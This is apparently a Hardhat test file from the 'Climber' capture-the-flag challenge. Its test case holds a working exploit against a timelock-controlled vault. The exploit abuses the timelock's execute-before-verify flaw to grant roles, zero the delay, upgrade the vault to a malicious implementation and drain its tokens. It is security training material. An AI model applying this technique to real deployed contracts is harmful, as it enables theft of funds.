const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {
        // timelock verifies proposal after executing the operation. we can upgrade the vault by executing the follow operation:
        // 1. grant proposer role to the vault so it can schedule an operation
        // 2. decrease the update delay to 0 so the operation is ready to be executed as soon as it is scheduled
        // 3. upgrade the vault to an arbitrary implementation that will schedule the proposal back to the timelock
        //    so that getOperationState returns ReadyForExecution. This new implementation allows us to steal the funds.
        const HackUpgradeFactory = await ethers.getContractFactory('HackUpgrade', attacker);
        const hackUpgrade = await HackUpgradeFactory.deploy();

        const propserRole = ethers.utils.solidityKeccak256(['string'], ['PROPOSER_ROLE']);

        const grantRoleData = this.timelock.interface.encodeFunctionData('grantRole', [propserRole, this.vault.address]);
        const updateDelayData = this.timelock.interface.encodeFunctionData('updateDelay', [0]);
        const upgradeData = this.vault.interface.encodeFunctionData('upgradeTo', [hackUpgrade.address]);

        await this.timelock.connect(attacker).execute(
            [this.timelock.address, this.timelock.address, this.vault.address], // targets
            [0, 0, 0], // values
            [grantRoleData, updateDelayData, upgradeData], // datas,
            ethers.utils.formatBytes32String('h4ck'), // salt
        );

        const hackedVault = await HackUpgradeFactory.attach(this.vault.address);
        hackedVault.connect(attacker).sweep(this.token.address, attacker.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
